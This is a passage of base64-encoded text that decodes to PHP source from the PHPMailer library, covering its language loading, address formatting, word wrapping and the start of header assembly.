YW5ub3Qgc2V0IG9yIHJlc2V0IHZhcmlhYmxlOiAnLA0KICAgICAgICAgICAgJ2V4dGVuc2lvbl9taXNzaW5nJyA9PiAnRXh0ZW5zaW9uIG1pc3Npbmc6ICcNCiAgICAgICAgKTsNCiAgICAgICAgaWYgKGVtcHR5KCRsYW5nX3BhdGgpKSB7DQogICAgICAgICAgICAvLyBDYWxjdWxhdGUgYW4gYWJzb2x1dGUgcGF0aCBzbyBpdCBjYW4gd29yayBpZiBDV0QgaXMgbm90IGhlcmUNCiAgICAgICAgICAgICRsYW5nX3BhdGggPSBkaXJuYW1lKF9fRklMRV9fKS4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICdsYW5ndWFnZScuIERJUkVDVE9SWV9TRVBBUkFUT1I7DQogICAgICAgIH0NCiAgICAgICAgLy9WYWxpZGF0ZSAkbGFuZ2NvZGUNCiAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvXlthLXpdezJ9KD86X1thLXpBLVpdezJ9KT8kLycsICRsYW5nY29kZSkpIHsNCiAgICAgICAgICAgICRsYW5nY29kZSA9ICdlbic7DQogICAgICAgIH0NCiAgICAgICAgJGZvdW5kbGFuZyA9IHRydWU7DQogICAgICAgICRsYW5nX2ZpbGUgPSAkbGFuZ19wYXRoIC4gJ3BocG1haWxlci5sYW5nLScgLiAkbGFuZ2NvZGUgLiAnLnBocCc7DQogICAgICAgIC8vIFRoZXJlIGlzIG5vIEVuZ2xpc2ggdHJhbnNsYXRpb24gZmlsZQ0KICAgICAgICBpZiAoJGxhbmdjb2RlICE9ICdlbicpIHsNCiAgICAgICAgICAgIC8vIE1ha2Ugc3VyZSBsYW5ndWFnZSBmaWxlIHBhdGggaXMgcmVhZGFibGUNCiAgICAgICAgICAgIGlmICghc2VsZjo6aXNQZXJtaXR0ZWRQYXRoKCRsYW5nX2ZpbGUpIG9yICFpc19yZWFkYWJsZSgkbGFuZ19maWxlKSkgew0KICAgICAgICAgICAgICAgICRmb3VuZGxhbmcgPSBmYWxzZTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgLy8gT3ZlcndyaXRlIGxhbmd1YWdlLXNwZWNpZmljIHN0cmluZ3MuDQogICAgICAgICAgICAgICAgLy8gVGhpcyB3YXkgd2UnbGwgbmV2ZXIgaGF2ZSBtaXNzaW5nIHRyYW5zbGF0aW9uIGtleXMuDQogICAgICAgICAgICAgICAgJGZvdW5kbGFuZyA9IGluY2x1ZGUgJGxhbmdfZmlsZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+bGFuZ3VhZ2UgPSAkUEhQTUFJTEVSX0xBTkc7DQogICAgICAgIHJldHVybiAoYm9vbGVhbikkZm91bmRsYW5nOyAvLyBSZXR1cm5zIGZhbHNlIGlmIGxhbmd1YWdlIG5vdCBmb3VuZA0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEdldCB0aGUgYXJyYXkgb2Ygc3RyaW5ncyBmb3IgdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuDQogICAgICogQHJldHVybiBhcnJheQ0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRUcmFuc2xhdGlvbnMoKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDcmVhdGUgcmVjaXBpZW50IGhlYWRlcnMuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlDQogICAgICogQHBhcmFtIGFycmF5ICRhZGRyIEFuIGFycmF5IG9mIHJlY2lwaWVudCwNCiAgICAgKiB3aGVyZSBlYWNoIHJlY2lwaWVudCBpcyBhIDItZWxlbWVudCBpbmRleGVkIGFycmF5IHdpdGggZWxlbWVudCAwIGNvbnRhaW5pbmcgYW4gYWRkcmVzcw0KICAgICAqIGFuZCBlbGVtZW50IDEgY29udGFpbmluZyBhIG5hbWUsIGxpa2U6DQogICAgICogYXJyYXkoYXJyYXkoJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlcicpLCBhcnJheSgnem9lQGV4YW1wbGUuY29tJywgJ1pvZSBVc2VyJykpDQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckFwcGVuZCgkdHlwZSwgJGFkZHIpDQogICAgew0KICAgICAgICAkYWRkcmVzc2VzID0gYXJyYXkoKTsNCiAgICAgICAgZm9yZWFjaCAoJGFkZHIgYXMgJGFkZHJlc3MpIHsNCiAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCRhZGRyZXNzKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHR5cGUgLiAnOiAnIC4gaW1wbG9kZSgnLCAnLCAkYWRkcmVzc2VzKSAuICR0aGlzLT5MRTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBGb3JtYXQgYW4gYWRkcmVzcyBmb3IgdXNlIGluIGEgbWVzc2FnZSBoZWFkZXIuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcGFyYW0gYXJyYXkgJGFkZHIgQSAyLWVsZW1lbnQgaW5kZXhlZCBhcnJheSwgZWxlbWVudCAwIGNvbnRhaW5pbmcgYW4gYWRkcmVzcywgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lDQogICAgICogICAgICBsaWtlIGFycmF5KCdqb2VAZXhhbXBsZS5jb20nLCAnSm9lIFVzZXInKQ0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGFkZHJGb3JtYXQoJGFkZHIpDQogICAgew0KICAgICAgICBpZiAoZW1wdHkoJGFkZHJbMV0pKSB7IC8vIE5vIG5hbWUgcHJvdmlkZWQNCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VjdXJlSGVhZGVyKCRhZGRyWzBdKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMV0pLCAncGhyYXNlJykgLiAnIDwnIC4gJHRoaXMtPnNlY3VyZUhlYWRlcigNCiAgICAgICAgICAgICAgICAkYWRkclswXQ0KICAgICAgICAgICAgKSAuICc+JzsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFdvcmQtd3JhcCBtZXNzYWdlLg0KICAgICAqIEZvciB1c2Ugd2l0aCBtYWlsZXJzIHRoYXQgZG8gbm90IGF1dG9tYXRpY2FsbHkgcGVyZm9ybSB3cmFwcGluZw0KICAgICAqIGFuZCBmb3IgcXVvdGVkLXByaW50YWJsZSBlbmNvZGVkIG1lc3NhZ2VzLg0KICAgICAqIE9yaWdpbmFsIHdyaXR0ZW4gYnkgcGhpbGlwcGUuDQogICAgICogQHBhcmFtIHN0cmluZyAkbWVzc2FnZSBUaGUgbWVzc2FnZSB0byB3cmFwDQogICAgICogQHBhcmFtIGludGVnZXIgJGxlbmd0aCBUaGUgbGluZSBsZW5ndGggdG8gd3JhcCB0bw0KICAgICAqIEBwYXJhbSBib29sZWFuICRxcF9tb2RlIFdoZXRoZXIgdG8gcnVuIGluIFF1b3RlZC1QcmludGFibGUgbW9kZQ0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gd3JhcFRleHQoJG1lc3NhZ2UsICRsZW5ndGgsICRxcF9tb2RlID0gZmFsc2UpDQogICAgew0KICAgICAgICBpZiAoJHFwX21vZGUpIHsNCiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gc3ByaW50ZignID0lcycsICR0aGlzLT5MRSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkc29mdF9icmVhayA9ICR0aGlzLT5MRTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBJZiB1dGYtOCBlbmNvZGluZyBpcyB1c2VkLCB3ZSB3aWxsIG5lZWQgdG8gbWFrZSBzdXJlIHdlIGRvbid0DQogICAgICAgIC8vIHNwbGl0IG11bHRpYnl0ZSBjaGFyYWN0ZXJzIHdoZW4gd2Ugd3JhcA0KICAgICAgICAkaXNfdXRmOCA9IChzdHJ0b2xvd2VyKCR0aGlzLT5DaGFyU2V0KSA9PSAndXRmLTgnKTsNCiAgICAgICAgJGxlbGVuID0gc3RybGVuKCR0aGlzLT5MRSk7DQogICAgICAgICRjcmxmbGVuID0gc3RybGVuKHNlbGY6OkNSTEYpOw0KDQogICAgICAgICRtZXNzYWdlID0gJHRoaXMtPmZpeEVPTCgkbWVzc2FnZSk7DQogICAgICAgIC8vUmVtb3ZlIGEgdHJhaWxpbmcgbGluZSBicmVhaw0KICAgICAgICBpZiAoc3Vic3RyKCRtZXNzYWdlLCAtJGxlbGVuKSA9PSAkdGhpcy0+TEUpIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gc3Vic3RyKCRtZXNzYWdlLCAwLCAtJGxlbGVuKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vU3BsaXQgbWVzc2FnZSBpbnRvIGxpbmVzDQogICAgICAgICRsaW5lcyA9IGV4cGxvZGUoJHRoaXMtPkxFLCAkbWVzc2FnZSk7DQogICAgICAgIC8vTWVzc2FnZSB3aWxsIGJlIHJlYnVpbHQgaW4gaGVyZQ0KICAgICAgICAkbWVzc2FnZSA9ICcnOw0KICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGxpbmUpIHsNCiAgICAgICAgICAgICR3b3JkcyA9IGV4cGxvZGUoJyAnLCAkbGluZSk7DQogICAgICAgICAgICAkYnVmID0gJyc7DQogICAgICAgICAgICAkZmlyc3R3b3JkID0gdHJ1ZTsNCiAgICAgICAgICAgIGZvcmVhY2ggKCR3b3JkcyBhcyAkd29yZCkgew0KICAgICAgICAgICAgICAgIGlmICgkcXBfbW9kZSBhbmQgKHN0cmxlbigkd29yZCkgPiAkbGVuZ3RoKSkgew0KICAgICAgICAgICAgICAgICAgICAkc3BhY2VfbGVmdCA9ICRsZW5ndGggLSBzdHJsZW4oJGJ1ZikgLSAkY3JsZmxlbjsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCEkZmlyc3R3b3JkKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHNwYWNlX2xlZnQgPiAyMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gPSAkc3BhY2VfbGVmdDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGlzX3V0ZjgpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMSwgMSkgPT0gJz0nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4tLTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMiwgMSkgPT0gJz0nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gLT0gMjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR3b3JkID0gc3Vic3RyKCR3b3JkLCAkbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICcgJyAuICRwYXJ0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuICRzb2Z0X2JyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICcnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHdoaWxlIChzdHJsZW4oJHdvcmQpID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRsZW5ndGggPD0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRsZW5ndGg7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGlzX3V0ZjgpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHRoaXMtPnV0ZjhDaGFyQm91bmRhcnkoJHdvcmQsICRsZW4pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKHN1YnN0cigkd29yZCwgJGxlbiAtIDEsIDEpID09ICc9Jykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4tLTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAnPScpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuIC09IDI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7DQogICAgICAgICAgICAgICAgICAgICAgICAkd29yZCA9IHN1YnN0cigkd29yZCwgJGxlbik7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJHdvcmQpID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRwYXJ0IC4gc3ByaW50ZignPSVzJywgc2VsZjo6Q1JMRik7DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkcGFydDsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRidWZfbyA9ICRidWY7DQogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICc7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAkd29yZDsNCg0KICAgICAgICAgICAgICAgICAgICBpZiAoc3RybGVuKCRidWYpID4gJGxlbmd0aCBhbmQgJGJ1Zl9vICE9ICcnKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmX28gLiAkc29mdF9icmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkd29yZDsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkZmlyc3R3b3JkID0gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmIC4gc2VsZjo6Q1JMRjsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiAkbWVzc2FnZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBGaW5kIHRoZSBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBwcmlvciB0byAkbWF4TGVuZ3RoIGluIGEgdXRmLTgNCiAgICAgKiBxdW90ZWQtcHJpbnRhYmxlIGVuY29kZWQgc3RyaW5nLg0KICAgICAqIE9yaWdpbmFsIHdyaXR0ZW4gYnkgQ29saW4gQnJvd24uDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGVkVGV4dCB1dGYtOCBRUCB0ZXh0DQogICAgICogQHBhcmFtIGludGVnZXIgJG1heExlbmd0aCBGaW5kIHRoZSBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBwcmlvciB0byB0aGlzIGxlbmd0aA0KICAgICAqIEByZXR1cm4gaW50ZWdlcg0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiB1dGY4Q2hhckJvdW5kYXJ5KCRlbmNvZGVkVGV4dCwgJG1heExlbmd0aCkNCiAgICB7DQogICAgICAgICRmb3VuZFNwbGl0UG9zID0gZmFsc2U7DQogICAgICAgICRsb29rQmFjayA9IDM7DQogICAgICAgIHdoaWxlICghJGZvdW5kU3BsaXRQb3MpIHsNCiAgICAgICAgICAgICRsYXN0Q2h1bmsgPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrLCAkbG9va0JhY2spOw0KICAgICAgICAgICAgJGVuY29kZWRDaGFyUG9zID0gc3RycG9zKCRsYXN0Q2h1bmssICc9Jyk7DQogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlbmNvZGVkQ2hhclBvcykgew0KICAgICAgICAgICAgICAgIC8vIEZvdW5kIHN0YXJ0IG9mIGVuY29kZWQgY2hhcmFjdGVyIGJ5dGUgd2l0aGluICRsb29rQmFjayBibG9jay4NCiAgICAgICAgICAgICAgICAvLyBDaGVjayB0aGUgZW5jb2RlZCBieXRlIHZhbHVlICh0aGUgMiBjaGFycyBhZnRlciB0aGUgJz0nKQ0KICAgICAgICAgICAgICAgICRoZXggPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrICsgJGVuY29kZWRDaGFyUG9zICsgMSwgMik7DQogICAgICAgICAgICAgICAgJGRlYyA9IGhleGRlYygkaGV4KTsNCiAgICAgICAgICAgICAgICBpZiAoJGRlYyA8IDEyOCkgew0KICAgICAgICAgICAgICAgICAgICAvLyBTaW5nbGUgYnl0ZSBjaGFyYWN0ZXIuDQogICAgICAgICAgICAgICAgICAgIC8vIElmIHRoZSBlbmNvZGVkIGNoYXIgd2FzIGZvdW5kIGF0IHBvcyAwLCBpdCB3aWxsIGZpdA0KICAgICAgICAgICAgICAgICAgICAvLyBvdGhlcndpc2UgcmVkdWNlIG1heExlbmd0aCB0byBzdGFydCBvZiB0aGUgZW5jb2RlZCBjaGFyDQogICAgICAgICAgICAgICAgICAgIGlmICgkZW5jb2RlZENoYXJQb3MgPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkbWF4TGVuZ3RoID0gJG1heExlbmd0aCAtICgkbG9va0JhY2sgLSAkZW5jb2RlZENoYXJQb3MpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGRlYyA+PSAxOTIpIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gRmlyc3QgYnl0ZSBvZiBhIG11bHRpIGJ5dGUgY2hhcmFjdGVyDQogICAgICAgICAgICAgICAgICAgIC8vIFJlZHVjZSBtYXhMZW5ndGggdG8gc3BsaXQgYXQgc3RhcnQgb2YgY2hhcmFjdGVyDQogICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggPSAkbWF4TGVuZ3RoIC0gKCRsb29rQmFjayAtICRlbmNvZGVkQ2hhclBvcyk7DQogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGRlYyA8IDE5Mikgew0KICAgICAgICAgICAgICAgICAgICAvLyBNaWRkbGUgYnl0ZSBvZiBhIG11bHRpIGJ5dGUgY2hhcmFjdGVyLCBsb29rIGZ1cnRoZXIgYmFjaw0KICAgICAgICAgICAgICAgICAgICAkbG9va0JhY2sgKz0gMzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIC8vIE5vIGVuY29kZWQgY2hhcmFjdGVyIGZvdW5kDQogICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkbWF4TGVuZ3RoOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFwcGx5IHdvcmQgd3JhcHBpbmcgdG8gdGhlIG1lc3NhZ2UgYm9keS4NCiAgICAgKiBXcmFwcyB0aGUgbWVzc2FnZSBib2R5IHRvIHRoZSBudW1iZXIgb2YgY2hhcnMgc2V0IGluIHRoZSBXb3JkV3JhcCBwcm9wZXJ0eS4NCiAgICAgKiBZb3Ugc2hvdWxkIG9ubHkgZG8gdGhpcyB0byBwbGFpbi10ZXh0IGJvZGllcyBhcyB3cmFwcGluZyBIVE1MIHRhZ3MgbWF5IGJyZWFrIHRoZW0uDQogICAgICogVGhpcyBpcyBjYWxsZWQgYXV0b21hdGljYWxseSBieSBjcmVhdGVCb2R5KCksIHNvIHlvdSBkb24ndCBuZWVkIHRvIGNhbGwgaXQgeW91cnNlbGYuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcmV0dXJuIHZvaWQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0V29yZFdyYXAoKQ0KICAgIHsNCiAgICAgICAgaWYgKCR0aGlzLT5Xb3JkV3JhcCA8IDEpIHsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KDQogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgew0KICAgICAgICAgICAgY2FzZSAnYWx0JzoNCiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmUnOg0KICAgICAgICAgICAgY2FzZSAnYWx0X2F0dGFjaCc6DQogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6DQogICAgICAgICAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAkdGhpcy0+d3JhcFRleHQoJHRoaXMtPkFsdEJvZHksICR0aGlzLT5Xb3JkV3JhcCk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICR0aGlzLT5Cb2R5ID0gJHRoaXMtPndyYXBUZXh0KCR0aGlzLT5Cb2R5LCAkdGhpcy0+V29yZFdyYXApOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQXNzZW1ibGUgbWVzc2FnZSBoZWFkZXJzLg0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGFzc2VtYmxlZCBoZWFkZXJzDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGNyZWF0ZUhlYWRlcigpDQogICAgew0KICAgICAgICAkcmVzdWx0ID0gJyc7DQoNCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnRGF0ZScsICR0aGlzLT5NZXNzYWdlRGF0ZSA9PSAnJyA/IHNlbGY6OnJmY0RhdGUoKSA6ICR0aGlzLT5NZXNzYWdlRGF0ZSk7DQoNCiAgICAgICAgLy8gVG8gYmUgY3JlYXRlZCBhdXRvbWF0aWNhbGx5IGJ5IG1haWwoKQ0KICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7DQogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsNCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvYWRkcikgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U2luZ2xlVG9BcnJheVtdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaWYgKGNvdW50KCR0aGlzLT50bykgPiAwKSB7DQogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7DQogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1RvJywgJHRoaXMtPnRvKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2VpZiAoY291bnQoJHRoaXMtPmNjKSA9PSAwKSB7DQogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdGcm9tJywgYXJyYXkoYXJyYXkodHJpbSgkdGhpcy0+RnJvbSksICR0aGlzLT5Gcm9tTmFtZSkpKTsNCg0KICAgICAgICAvLyBzZW5kbWFpbCBhbmQgbWFpbCgpIGV4dHJhY3QgQ2MgZnJvbSB0aGUgaGVhZGVyIGJlZm9yZSBzZW5kaW5nDQogICAgICAgIGlmIChjb3VudCgkdGhpcy0+Y2MpID4gMCkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnQ2MnLCAkdGhpcy0+Y2MpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gc2VuZG1haWwgYW5kIG1haWwoKSBleHRyYWN0IEJjYyBmcm9tIHRoZSBoZWFkZXIgYmVmb3JlIHNlbmRpbmcNCiAgICAgICAgaWYgKCgNCiAgICAgICAgICAgICAgICAkdGhpcy0+TWFpbGVyID09ICdzZW5kbWFpbCcgb3IgJHRoaXMtPk1haWxlciA9PSAncW1haWwnIG9yICR0aGlzLT5NYWlsZXIgPT0gJ21haWwnDQogICAgICAgICAgICApDQogICAgICAgICAgICBhbmQgY291bnQoJHRoaXMtPmJjYykgPiAwDQogICAgICAgICkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnQmNjJywgJHRoaXMtPmJjYyk7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoY291bnQoJHRoaXMtPlJlcGx5VG8pID4gMCkgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnUmVwbHktVG8nLCAkdGhpcy0+UmVwbHlUbyk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBtYWlsKCkgc2V0cyB0aGUgc3ViamVjdCBpdHNlbGYNCiAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7DQogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdTdWJqZWN0JywgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSkpOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gT25seSBhbGxvdyBhIGN1c3RvbSBtZXNzYWdlIElEIGlmIGl0IGNvbmZvcm1zIHRvIFJGQyA1MzIyIHNlY3Rpb24gMy42LjQNCiAgICAgICAgLy8gaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjIjc2VjdGlvbi0zLjYuNA0KICAgICAgICBpZiAoJycgIT0gJHRoaXMtPk1lc3NhZ2VJRCBhbmQgcHJlZ19tYXRjaCgnL148LipALio+JC8nLCAkdGhpcy0+TWVzc2FnZUlEKSkgew0KICAgICAgICAgICAgJHRoaXMtPmxhc3RNZXNzYWdlSUQgPSAkdGhpcy0+TWVzc2FnZUlEOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPmxhc3RNZXNzYWdlSUQgPSBzcHJpbnRmKCc8JXNAJXM+JywgJHRoaXMtPnVuaXF1ZWlkLCAkdGhpcy0+c2VydmVySG9zdG5hbWUoKSk7DQogICAgICAgIH0NCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnTWVzc2FnZS1JRCcsICR0aGlzLT5sYXN0TWVzc2FnZUlEKTsNCiAgICAgICAgaWYgKCFpc19udWxsKCR0aGlzLT5Qcmlvcml0eSkpIHsNCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1gtUHJpb3JpdHknLCAkdGhpcy0+UHJpb3JpdHkpOw0KICAgICAgICB9DQogICAgICAgIGlmICgkdGhpcy0+WE1haWxlciA9PSAnJykgew0KICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgNCiAgICAgICAgICAgICAgICAnWC1NYWlsZXInLA0KICAgICAgICAgICAgICAgICdQSFBNYWlsZXIgJyAuICR0aGlzLT5WZXJzaW9uIC4gJyAoaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIpJw0KICAgICAgICAgICAgKTsNCiAgICAgICAgf